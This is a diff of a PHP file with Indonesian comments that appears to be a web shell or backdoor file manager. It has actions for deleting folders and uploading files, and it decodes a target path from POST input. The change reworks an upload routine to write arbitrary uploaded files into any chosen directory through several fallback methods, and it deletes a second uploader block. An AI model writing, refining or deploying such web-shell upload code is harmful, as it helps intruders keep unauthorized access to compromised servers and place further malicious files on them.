@@ -927,6 +927,7 @@ else if($awal == 'hapus_folder' && isset($_POST['zf']) && is_string($_POST['zf']
 	$awal = 'dasar';
 }
 else if ($awal == 'upl_file' && isset($_FILES['ufile'])) {
+    // Fungsi upload yang dimodifikasi agar anti-0kb
     function smart_upload($fileKey, $targetDir) {
         $res = [
             'success' => false,
@@ -934,58 +935,54 @@ else if ($awal == 'upl_file' && isset($_FILES['ufile'])) {
             'message' => '',
             'name'    => ''
         ];
-        
+
+        // Validasi dasar
         if (!isset($_FILES[$fileKey]) || $_FILES[$fileKey]['error'] !== UPLOAD_ERR_OK) {
-            $errCode = isset($_FILES[$fileKey]['error']) ? $_FILES[$fileKey]['error'] : 'unknown';
-            $res['message'] = 'Upload error code: ' . $errCode;
+            $res['message'] = 'Upload error code: ' . (isset($_FILES[$fileKey]['error']) ? $_FILES[$fileKey]['error'] : 'unknown');
             return $res;
         }
 
         $filename = basename($_FILES[$fileKey]['name']);
         $tmp      = $_FILES[$fileKey]['tmp_name'];
-        $dest     = rtrim($targetDir, '/') . '/' . $filename;
         
-        // Coba 1: move_uploaded_file (Standar)
+        // Pastikan target dir memiliki slash di akhir
+        $pemisah = substr($targetDir, -1) !== "/" ? "/" : "";
+        $dest    = $targetDir . $pemisah . $filename;
+
+        // Cek apakah file tmp ada isinya
+        if (filesize($tmp) <= 0) {
+            $res['message'] = 'File tmp kosong (0kb). Upload gagal dari server.';
+            return $res;
+        }
+
+        // Method 1: move_uploaded_file (Standar)
         if (@move_uploaded_file($tmp, $dest)) {
             $res['success'] = true;
             $res['method'] = 'move_uploaded_file';
         }
-        // Coba 2: Stream Copy (SOLUSI ANTI 0KB & MEMORY LIMIT)
-        elseif ($in = @fopen($tmp, "rb")) {
-            if ($out = @fopen($dest, "wb")) {
-                while ($buff = fread($in, 4096)) {
-                    fwrite($out, $buff);
-                }
-                fclose($out);
-                $res['success'] = true;
-                $res['method'] = 'stream_copy';
-            }
-            fclose($in);
-        }
-        // Coba 3: copy() (Fallback sederhana)
+        // Method 2: copy (Jika open_basedir mengizinkan akses tmp)
         elseif (@copy($tmp, $dest)) {
             $res['success'] = true;
             $res['method'] = 'copy';
         }
-        // Coba 4: file_get_contents (Hanya untuk file kecil)
-        elseif (($data = @file_get_contents($tmp)) !== false && @file_put_contents($dest, $data)) {
-            $res['success'] = true;
-            $res['method'] = 'file_get_contents';
+        // Method 3: Baca konten dulu baru tulis (Mencegah write file kosong jika baca gagal)
+        else {
+            $content = @file_get_contents($tmp);
+            if ($content !== false && strlen($content) > 0) {
+                if (@file_put_contents($dest, $content) !== false) {
+                    $res['success'] = true;
+                    $res['method'] = 'content_read_write';
+                }
+            }
         }
 
-        // VALIDASI AKHIR: Pastikan file ada dan ukurannya > 0
+        // Finalisasi
         if ($res['success']) {
-            if (file_exists($dest) && filesize($dest) > 0) {
-                @chmod($dest, 0644); // Coba set permission agar bisa dibaca
-                $res['name'] = $filename;
-                $res['message'] = "File uploaded successfully (<strong>{$res['method']}</strong>): <a href=\"" . htmlspecialchars($filename) . "\" target=\"_blank\">" . htmlspecialchars($filename) . "</a>";
-            } else {
-                $res['success'] = false;
-                $res['message'] = "Upload terdeteksi sukses tapi file kosong (0kb). Cek permission folder.";
-                @unlink($dest); // Hapus file kosong
-            }
+            @chmod($dest, 0644); // Fix permission agar bisa dibaca/edit
+            $res['name'] = $filename;
+            $res['message'] = "File uploaded successfully (<strong>{$res['method']}</strong>): " . htmlspecialchars($filename);
         } else {
-            $res['message'] = "Gagal upload. Direktori mungkin tidak writeable atau fungsi diblokir.";
+            $res['message'] = "Gagal upload. Server mungkin membatasi akses ke folder tmp atau write permission.";
         }
 
         return $res;
@@ -996,79 +993,6 @@ else if ($awal == 'upl_file' && isset($_FILES['ufile'])) {
 }
 
 
-?>
-<?php
-error_reporting(E_ALL);
-ini_set('display_errors', 1);
-
-// PHP configuration for file upload
-ini_set('upload_max_filesize', '64M');
-ini_set('post_max_size', '64M');
-ini_set('max_input_time', '300');
-ini_set('max_execution_time', '300');
-/**
- * Function for sanitizing file name
- * Only allows alphanumeric, underscore, dot, and dash characters.
- * If the file name is the same as the uploader file, add a prefix.
- */
-function sanitizeFilename($filename) {
-    $filename = preg_replace('/[^a-zA-Z0-9_\.-]/', '_', basename($filename));
-    if ($filename === basename(__FILE__)) {
-        $filename = 'upload_' . $filename;
-    }
-    return $filename;
-}
-
-$msg = '';
-
-if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-    // Make sure the file has been uploaded without errors
-    if (isset($_FILES['upload_file']) && $_FILES['upload_file']['error'] === UPLOAD_ERR_OK) {
-        $originalName = $_FILES['upload_file']['name'];
-        $filename = sanitizeFilename($originalName);
-        // Get the destination directory from the 'berkas' input
-        if (isset($_POST['berkas']) && is_string($_POST['berkas']) && !empty($_POST['berkas'])) {
-            $targetDir = uraikan($_POST['berkas']);
-            if (!is_dir($targetDir)) {
-                $targetDir = __DIR__;
-            }
-        } else {
-            $targetDir = __DIR__;
-        }
-        // Make sure there is no trailing slash
-        $destination = rtrim($targetDir, '/') . '/' . $filename;
-
-        // Try the main method: move_uploaded_file()
-        if (move_uploaded_file($_FILES['upload_file']['tmp_name'], $destination)) {
-            // Change file permissions to be accessible
-            chmod($destination, 0644);
-            $msg = "File <strong>$filename</strong> uploaded successfully via move_uploaded_file.";
-        } else {
-            // If it fails, try a fallback with copy()
-            if (copy($_FILES['upload_file']['tmp_name'], $destination)) {
-                unlink($_FILES['upload_file']['tmp_name']);
-                chmod($destination, 0644);
-                $msg = "File <strong>$filename</strong> uploaded successfully using fallback method copy().";
-            } else {
-                // Last fallback with file_get_contents + file_put_contents
-                $contents = file_get_contents($_FILES['upload_file']['tmp_name']);
-                if ($contents !== false && file_put_contents($destination, $contents)) {
-           
-                     unlink($_FILES['upload_file']['tmp_name']);
-                     chmod($destination, 0644);
-                    $msg = "File <strong>$filename</strong> uploaded successfully using fallback method file_get_contents() and file_put_contents().";
-                } else {
-                    $msg = "Failed to upload file. Please check directory permissions and server configuration.";
-                }
-            }
-        }
-    } else {
-        $errorCode = isset($_FILES['upload_file']['error']) ? $_FILES['upload_file']['error'] : 'unknown';
-        if($errorCode !== UPLOAD_ERR_NO_FILE) {
-            $msg = "An error occurred while uploading the file. (Error code: $errorCode)";
-        }
-    }
-}
 ?>
 <!DOCTYPE html>
 <html>
